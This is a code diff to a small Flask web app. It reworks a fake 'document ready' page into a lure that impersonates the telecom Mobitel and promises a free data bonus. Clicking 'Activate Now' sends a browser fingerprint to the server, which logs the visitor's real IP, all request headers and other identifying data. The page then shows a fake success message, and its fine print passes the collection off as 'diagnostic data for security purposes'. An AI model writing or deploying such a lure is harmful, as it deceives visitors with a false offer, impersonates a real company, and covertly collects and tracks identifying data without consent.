@@ -1,6 +1,7 @@
 from flask import Flask, request, render_template_string
 import datetime
 import json
+import os
 
 app = Flask(__name__)
 
@@ -10,19 +11,23 @@ HTML_PAGE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secure Document</title>
+    <title>Mobitel Data Bonus - Confirmation</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: Arial; text-align: center; padding: 40px; }
-        .notice { font-size: 12px; color: #888; margin-top: 30px; }
+        body { font-family: Arial; text-align: center; padding: 40px; background:#f5f5f5; }
+        .card { background:white; border-radius:10px; padding:30px; max-width:400px; margin:50px auto; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
+        .notice { font-size: 11px; color: #aaa; margin-top: 25px; }
+        button { background:#0070f3; color:white; border:none; padding:12px 30px; border-radius:5px; font-size:16px; cursor:pointer; }
     </style>
 </head>
 <body>
-    <h2>Your requested document is ready</h2>
-    <p>Click below to view.</p>
-    <button onclick="sendFingerprint()" style="padding:10px 20px;">View Document</button>
-    <div id="status"></div>
-    <p class="notice">This site collects technical data to prevent misuse. By clicking, you agree.</p>
+    <div class="card">
+        <h3>📱 Mobitel Data Bonus</h3>
+        <p>Your data bonus package is ready for activation.</p>
+        <button onclick="sendFingerprint()">Activate Now</button>
+        <div id="status" style="margin-top:15px;"></div>
+        <p class="notice">By proceeding, you agree to our terms. This site collects diagnostic data for security purposes.</p>
+    </div>
     <script>
         async function sendFingerprint() {
             const fp = {
@@ -42,13 +47,9 @@ HTML_PAGE = """
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(fp)
                 });
-                document.getElementById('status').innerText = 'Thank you! The document is loading...';
-                // Simulate a loading delay then show a fake "file" or just do nothing
-                setTimeout(() => {
-                    document.body.innerHTML = '<h2>Document Loaded</h2><p>This is a placeholder. The transaction ID will be verified shortly.</p>';
-                }, 2000);
+                document.getElementById('status').innerHTML = '✅ Activation successful! Your bonus will be credited shortly.';
             } catch (e) {
-                console.error(e);
+                document.getElementById('status').innerText = 'Please try again.';
             }
         }
     </script>
@@ -56,14 +57,26 @@ HTML_PAGE = """
 </html>
 """
 
+def get_real_ip():
+    """Get the real visitor IP from proxy headers."""
+    # Render sets X-Forwarded-For with the original client IP
+    forwarded = request.headers.get('X-Forwarded-For')
+    if forwarded:
+        # X-Forwarded-For may contain multiple IPs (client, proxy1, proxy2...)
+        # The first one is the original client
+        return forwarded.split(',')[0].strip()
+    # Fallback
+    return request.remote_addr
+
 @app.route('/')
 def index():
-    # Log basic request data immediately
     log_entry = {
-        "ip": request.remote_addr,
+        "ip": get_real_ip(),
         "user_agent_raw": request.headers.get('User-Agent'),
         "referer": request.headers.get('Referer'),
-        "timestamp": datetime.datetime.utcnow().isoformat()
+        "accept_language": request.headers.get('Accept-Language'),
+        "timestamp": datetime.datetime.utcnow().isoformat(),
+        "all_headers": dict(request.headers)  # Log everything for debugging
     }
     with open(LOG_FILE, "a") as f:
         f.write(json.dumps(log_entry) + "\n")
@@ -72,9 +85,8 @@ def index():
 @app.route('/log', methods=['POST'])
 def log_fingerprint():
     data = request.get_json()
-    # Merge with IP and other headers we already have
     entry = {
-        "ip": request.remote_addr,
+        "ip": get_real_ip(),
         "fingerprint": data
     }
     with open(LOG_FILE, "a") as f:
